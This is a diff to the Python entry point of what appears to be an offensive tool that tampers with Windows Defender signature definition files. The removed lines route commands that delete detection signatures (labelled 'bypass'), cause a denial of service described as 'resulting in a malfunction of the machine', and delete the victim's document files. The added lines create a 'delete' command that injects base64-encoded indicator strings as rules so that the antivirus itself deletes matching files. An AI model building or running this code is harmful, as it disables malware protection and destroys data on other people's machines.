@@ -1,12 +1,14 @@
 import os
+import base64
 import winreg
-
 import logging
 import argparse
 
 from core.utils import version_banner
 from core.utils.logger import init_logger
-from core.definition_update import DefinitionUpdate
+from core.definitions import Definitions
+
+from core.features.delete import DeletePEMockFile
 
 def get_defualt_definition_update_path() -> str:
     logging.info("Getting Signatures Location ...")
@@ -16,37 +18,20 @@ def get_defualt_definition_update_path() -> str:
     
     return signature_location[0]
 
-def handle_delete_command(args, definition_update: DefinitionUpdate):
-    if args.id or args.name:
-        definition_update.delete_threat(args.id, args.name)
-    elif args.match:
-        definition_update.delete_match_threat(args.match.encode())
-        
-    definition_update.export()
-
-def handle_do_dos(args, definition_update: DefinitionUpdate):
-    definition_update.do_dos()
-    definition_update.export()
-
-def router(args, definition_update: DefinitionUpdate):
+def router(args, definitions: Definitions):
     if args.command == 'bypass':
-        handle_delete_command(args, definition_update)
-    elif args.command == 'do-dos':
-        handle_do_dos(args, definition_update)
-    elif args.command == 'del-docs':
-        definition_update.delete_documents()
-        definition_update.export()
-    elif args.command == 'test':
-        definition_update.mpaspair.delete_test()
-        definition_update.export()
+        pass
+    elif args.command == 'delete':
+        string = base64.b64decode(args.string)
+        hstrs = [string]
+        DeletePEMockFile(definitions.get_anti_spayware_definitions(), hstrs).run()    
     else:
         logging.error(f"Unrecognized command: {args.command}")
-        pass
+        exit(1)
 
-def main():
-    init_logger()
-    print(version_banner())
+    definitions.export(args.o)
 
+def argument_parser():
     options = argparse.ArgumentParser(usage="%(prog)s command [options]", add_help = True, description = "Windows Defender Update")
     options.add_argument('-o', default='.', help='output folder for the exported vdm files')
     options.add_argument('-d', default=get_defualt_definition_update_path(), help='set explicit definition update path')
@@ -57,22 +42,27 @@ def main():
     bypass_group.add_argument('-match', help="delete all threats that his name containes <name>")
     bypass_group.add_argument('-name', help="delete threat by name")
     bypass_group.add_argument('-id', help="delete threat by his id")
+    
+    delete_parser = subparsers.add_parser('delete', help='delete file by modifiyng rules')
+    delete_parser.add_argument('--string', help='indication strings within the pefile (base64)', required=True)
+    
+    return options.parse_args()
 
-    subparsers.add_parser('do-dos', help='resulting in a malfunction of the machine')
-    subparsers.add_parser('del-docs', help='removing document files from the machine')
-    subparsers.add_parser('test', help='test')
+def main():
+    init_logger()
+    print(version_banner())
 
-    args = options.parse_args()
+    args = argument_parser()
+
     logging.info(f'Definitions Path: {args.d}')
-    defination_update_path = args.d
-    output_path = args.o
-    if not os.path.exists(output_path):
-        raise FileNotFoundError(f'Directory "{output_path}" was not found')
+    definations_path = args.d
+    
+    if not os.path.exists(args.o):
+        raise FileNotFoundError(f'Directory "{args.o}" was not found')
 
-    definition_update = DefinitionUpdate(defination_update_path)
-    definition_update.set_output_path(output_path)
+    definitions = Definitions(definations_path)
 
-    router(args, definition_update)
+    router(args, definitions)
     logging.info('Done!')
 
 if __name__ == "__main__":
